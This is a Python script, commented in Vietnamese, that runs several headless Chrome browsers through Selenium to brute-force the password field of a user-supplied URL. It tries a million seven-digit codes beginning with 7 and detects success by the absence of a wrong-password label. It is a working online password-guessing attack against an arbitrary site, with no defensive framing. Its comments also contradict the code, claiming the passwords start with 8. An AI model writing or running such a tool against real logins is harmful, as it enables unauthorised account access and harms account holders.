import threading
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Biến toàn cục để quản lý trạng thái
password_found = False
password_lock = threading.Lock()

# Hàm tạo mật khẩu bắt đầu bằng số 8
def generate_passwords_with_8(start, end):
    for i in range(start, end):
        yield f"7{str(i).zfill(6)}"  # Đảm bảo mật khẩu có dạng 8xxxxx

# Hàm khởi tạo trình duyệt
def create_driver():
    service = Service('C:/chromedriver/chromedriver.exe')  # Thay đổi đường dẫn nếu cần
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')  # Chạy chế độ không giao diện
    options.add_argument('--disable-gpu')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    return webdriver.Chrome(service=service, options=options)

# Hàm thử mật khẩu
def try_passwords(url, start, end):
    global password_found
    driver = create_driver()
    driver.get(url)

    try:
        # Đợi ô nhập mật khẩu xuất hiện
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, 'input[type="password"]')))
        print(f"Luồng {start}-{end}: Trang web đã tải xong. Bắt đầu thử mật khẩu...")

        # Thử mật khẩu trong phạm vi được chỉ định
        for password_to_test in generate_passwords_with_8(start, end):
            # Kiểm tra nếu một luồng khác đã tìm thấy mật khẩu
            with password_lock:
                if password_found:
                    print(f"Luồng {start}-{end}: Dừng lại vì mật khẩu đã được tìm thấy.")
                    break

            print(f"Luồng {start}-{end}: Thử mật khẩu: {password_to_test}")
            try:
                # Tìm ô nhập mật khẩu
                password_element = driver.find_element(By.CSS_SELECTOR, 'input[type="password"]')
                password_element.clear()
                password_element.send_keys(password_to_test)  # Nhập mật khẩu
                password_element.send_keys(Keys.RETURN)  # Nhấn Enter

                # Kiểm tra phản hồi
                try:
                    WebDriverWait(driver, 2).until(
                        EC.presence_of_element_located((By.CLASS_NAME, 'wrong_password_label'))
                    )
                    print(f"Luồng {start}-{end}: Mật khẩu không đúng!")
                except:
                    # Nếu không có thông báo lỗi, mật khẩu đúng
                    with password_lock:
                        password_found = True
                    print(f"Luồng {start}-{end}: Mật khẩu đúng: {password_to_test}. Đăng nhập thành công.")
                    break

            except Exception as e:
                print(f"Luồng {start}-{end}: Lỗi: {str(e)}")
                break
    finally:
        driver.quit()

# Số luồng và cấu hình phạm vi mật khẩu
NUM_THREADS = 4
TOTAL_PASSWORDS = 1000000
CHUNK_SIZE = TOTAL_PASSWORDS // NUM_THREADS

# URL trang web
url = input("Nhập URL của trang web: ")

# Tạo và khởi chạy các luồng
threads = []
for i in range(NUM_THREADS):
    start = i * CHUNK_SIZE
    end = start + CHUNK_SIZE
    thread = threading.Thread(target=try_passwords, args=(url, start, end))
    threads.append(thread)
    thread.start()

# Đợi tất cả các luồng hoàn thành
for thread in threads:
    thread.join()

# Kết thúc
if password_found:
    print("Quá trình thử mật khẩu hoàn tất. Mật khẩu đã được tìm thấy.")
else:
    print("Quá trình thử mật khẩu hoàn tất. Không tìm thấy mật khẩu đúng.")
